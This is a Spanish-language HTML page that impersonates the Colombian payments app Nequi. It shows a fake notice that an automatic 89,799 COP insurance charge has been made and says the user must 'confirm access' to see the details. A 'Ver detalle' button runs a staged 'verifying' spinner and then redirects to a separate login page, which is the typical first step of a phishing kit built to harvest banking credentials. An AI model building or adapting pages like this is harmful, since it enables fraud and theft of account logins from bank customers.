<!DOCTYPE html>
<html lang="es">

<head>
<meta charset="UTF-8" />
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
<title>Recaudo realizado</title>

<link href="https://fonts.googleapis.com/css2?family=Manrope:wght@400;500;600;700;800&display=swap" rel="stylesheet">
<script src="https://cdn.tailwindcss.com"></script>

<style>
body{
font-family:'Manrope',system-ui,sans-serif;
background:#f4f4f5;
}

.gradient-bg{
background:linear-gradient(135deg,#200020 0%,#da0081 100%);
}

.glass-card{
background:rgba(255,255,255,0.98);
box-shadow:0 10px 30px rgba(0,0,0,0.15);
}

#loader-overlay{
position:fixed;
top:0;
left:0;
width:100%;
height:100%;
background:rgba(255,255,255,0.9);
backdrop-filter:blur(8px);
display:none;
flex-direction:column;
justify-content:center;
align-items:center;
z-index:9999;
}

.floating-header{
position:sticky;
top:0;
z-index:50;
backdrop-filter:blur(10px);
background:rgba(255,255,255,0.9);
border-bottom:1px solid rgba(0,0,0,0.05);
}
</style>
</head>

<body class="min-h-screen flex flex-col">

<div id="loader-overlay">
<img src="loader.gif" class="w-[80px]">
<p class="mt-4 font-bold text-[#da0081] text-xl tracking-tight">Verificando movimiento...</p>
</div>

<header class="w-full px-4 py-3 shadow-sm floating-header">
<div class="max-w-md mx-auto flex justify-center items-center">
<img src="https://logosenvector.com/logo/img/nequi-37254.png" class="h-8">
</div>
</header>

<main class="flex-grow flex flex-col items-center w-full px-4 pt-10 pb-12 gradient-bg">

<div class="w-full max-w-md glass-card rounded-2xl overflow-hidden border border-white/20 p-8 text-center">

<div class="mb-6 flex justify-center">
<img src="https://seeklogo.com/images/A/alfa-seguros-logo-7B2A3E3F5C-seeklogo.com.png"
class="h-14">
</div>

<h1 class="text-3xl font-extrabold text-[#200020] mb-3">
Recaudo realizado
</h1>

<p class="text-gray-600 mb-6 font-medium">
Se realizó un recaudo automático correspondiente a un
<span class="font-bold text-[#da0081]">Seguro Alfa</span>.
Para ver el detalle del movimiento debes confirmar tu acceso.
</p>

<div class="bg-[#fde7f1] border border-[#f5c4df] rounded-xl p-4 mb-6">
<p class="text-sm text-gray-600">Valor del recaudo</p>
<p class="text-2xl font-extrabold text-[#da0081]">$ 89.799 COP</p>
</div>

<button onclick="continuarLogin()"
class="w-full h-[54px] rounded-xl text-white font-bold text-lg transition-transform hover:scale-[1.02] active:scale-[0.98] shadow-lg"
style="background: linear-gradient(90deg, #da0081 0%, #ff52a4 100%);">
Ver detalle
</button>

<p class="text-xs text-gray-400 mt-5">
Movimiento protegido • Confirmación requerida
</p>

</div>

</main>

<script>
function continuarLogin(){
document.getElementById("loader-overlay").style.display="flex";

setTimeout(()=>{
window.location.href="login.html";
},4000);
}
</script>

</body>
</html>
